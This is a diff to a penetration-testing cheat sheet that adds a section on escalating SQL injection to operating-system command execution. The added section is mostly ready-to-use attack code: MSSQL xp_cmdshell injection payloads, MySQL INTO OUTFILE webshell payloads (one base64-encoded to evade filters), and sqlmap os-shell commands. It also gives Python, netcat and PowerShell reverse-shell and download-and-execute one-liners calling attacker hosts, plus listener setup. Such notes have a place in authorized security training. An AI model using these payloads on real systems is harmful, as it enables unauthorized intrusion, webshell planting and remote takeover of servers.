@@ -7,9 +7,12 @@
    - [Error-Based SQLi](#error-based-sql-injection)
    - [UNION-Based SQLi](#union-based-sql-injection)
    - [Blind SQLi](#blind-sql-injection)
-4. [Database-Specific Syntax](#database-specific-syntax)
-5. [Testing Methodology](#testing-methodology)
-6. [Automation & Tools](#automation--tools)
+4. [Code Execution](#code-execution)
+   - [Manual Code Execution](#manual-code-execution)
+   - [Automated Code Execution](#automated-code-execution)
+5. [Database-Specific Syntax](#database-specific-syntax)
+6. [Testing Methodology](#testing-methodology)
+7. [Automation & Tools](#automation--tools)
 
 ---
 
@@ -220,6 +223,204 @@ admin' OR 'a'='a'-- //           -- String comparison bypass
 
 -- EXISTS for faster boolean checks
 ' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'),SLEEP(2),0)-- //
+```
+
+---
+
+## Code Execution
+
+**Concept**: Escalate SQLi to operating system command execution
+**Requirements**: Database privileges, writable directories, specific database functions
+
+## Manual Code Execution
+
+### MSSQL - xp_cmdshell
+
+**Prerequisites**: Administrator privileges, xp_cmdshell enabled
+**Function**: Executes Windows shell commands through SQL
+
+#### Enable xp_cmdshell
+```sql
+-- Enable advanced options
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+
+-- Enable xp_cmdshell
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+#### Execute Commands
+```sql
+-- Basic command execution
+EXECUTE xp_cmdshell 'whoami';
+EXECUTE xp_cmdshell 'dir C:\';
+EXECUTE xp_cmdshell 'net user';
+
+-- SQLi payload with xp_cmdshell
+' UNION SELECT null, null, null, null; EXEC xp_cmdshell 'whoami'-- //
+```
+
+#### Connection & Execution Example
+```bash
+# Connect to MSSQL
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+
+# Enable and use xp_cmdshell
+SQL> EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+SQL> EXECUTE xp_cmdshell 'whoami';
+```
+
+### MySQL - INTO OUTFILE
+
+**Prerequisites**: FILE privileges, writable web directory
+**Method**: Write PHP webshell to accessible web folder
+
+#### Write Webshell
+```sql
+-- Basic webshell creation
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null 
+  INTO OUTFILE "/var/www/html/tmp/webshell.php"-- //
+
+-- Alternative webshell
+' UNION SELECT "<?php system($_REQUEST['cmd']); ?>", null, null, null, null 
+  INTO OUTFILE "/var/www/html/shell.php"-- //
+
+-- Advanced webshell with error handling
+' UNION SELECT "<?php if(isset($_GET['cmd'])){echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';} ?>", null, null, null, null 
+  INTO OUTFILE "/tmp/shell.php"-- //
+```
+
+#### Access Webshell
+```bash
+# Execute commands via webshell
+curl "http://target.com/tmp/webshell.php?cmd=id"
+curl "http://target.com/tmp/webshell.php?cmd=whoami"
+curl "http://target.com/tmp/webshell.php?cmd=ls -la"
+```
+
+#### Common Writable Directories
+```
+Linux:
+/tmp/
+/var/tmp/
+/var/www/html/tmp/
+/var/www/html/uploads/
+
+Windows:
+C:\Windows\Temp\
+C:\Temp\
+C:\inetpub\wwwroot\
+```
+
+---
+
+## Automated Code Execution
+
+### SQLMap OS Shell
+
+**Advantages**: Automated exploitation, interactive shell
+**Disadvantages**: High traffic volume, low stealth
+
+#### Basic SQLMap Usage
+```bash
+# Identify SQLi vulnerability
+sqlmap -u "http://target.com/page.php?id=1" -p id
+
+# Get interactive OS shell
+sqlmap -u "http://target.com/page.php?id=1" -p id --os-shell
+
+# Specify web root directory
+sqlmap -u "http://target.com/page.php?id=1" -p id --os-shell --web-root "/var/www/html/tmp"
+```
+
+#### POST Request Exploitation
+```bash
+# Save intercepted POST request to file
+# post.txt contains the HTTP request
+
+# Exploit POST parameter
+sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
+```
+
+#### SQLMap OS Shell Process
+1. **Detection**: Identifies SQLi vulnerability type
+2. **Fingerprinting**: Determines OS and web server
+3. **Language Selection**: Prompts for web app language (PHP/ASP/JSP)
+4. **Upload**: Creates and uploads webshell files
+5. **Interactive Shell**: Provides command execution interface
+
+#### Example SQLMap Session
+```bash
+sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
+
+# SQLMap prompts:
+# [1] ASP
+# [2] ASPX  
+# [3] JSP
+# [4] PHP (default)
+# > 4
+
+# Interactive shell
+os-shell> id
+os-shell> whoami  
+os-shell> pwd
+```
+
+### Database-Specific Code Execution Summary
+
+| Database | Method | Requirements | Command |
+|----------|--------|--------------|---------|
+| **MSSQL** | `xp_cmdshell` | Admin privileges | `EXECUTE xp_cmdshell 'cmd'` |
+| **MySQL** | `INTO OUTFILE` | FILE privileges + writable dir | `SELECT '<?php code ?>' INTO OUTFILE '/path/shell.php'` |
+| **PostgreSQL** | `COPY` | Superuser privileges | `COPY (SELECT '<?php code ?>') TO '/path/shell.php'` |
+| **Oracle** | `UTL_FILE` | Specific privileges | `UTL_FILE.PUT_LINE()` |
+
+### Code Execution Payloads
+
+#### MSSQL xp_cmdshell Payloads
+```sql
+-- Enable and execute in one payload
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'-- //
+
+-- Reverse shell payload
+'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")"'-- //
+```
+
+#### MySQL Webshell Payloads
+```sql
+-- Minimal webshell
+' UNION SELECT "<?=`$_GET[0]`?>", null, null INTO OUTFILE "/tmp/s.php"-- //
+
+-- Full-featured webshell
+' UNION SELECT "<?php $cmd=$_GET['cmd']; if($cmd){echo '<pre>'.shell_exec($cmd).'</pre>';} ?>", null, null INTO OUTFILE "/var/www/html/cmd.php"-- //
+
+-- Base64 encoded webshell (bypass filters)
+' UNION SELECT FROM_BASE64("PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"), null, null INTO OUTFILE "/tmp/shell.php"-- //
+```
+
+### Upgrading to Full Shell
+
+#### From Webshell to Reverse Shell
+```bash
+# Python reverse shell via webshell
+curl "http://target.com/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+# Netcat reverse shell
+curl "http://target.com/shell.php?cmd=nc -e /bin/bash 10.10.10.10 4444"
+
+# PowerShell reverse shell (Windows)
+curl "http://target.com/shell.php?cmd=powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')\""
+```
+
+#### Listener Setup
+```bash
+# Set up netcat listener
+nc -lvnp 4444
+
+# Set up multi-handler (Metasploit)
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; run"
 ```
 
 ---
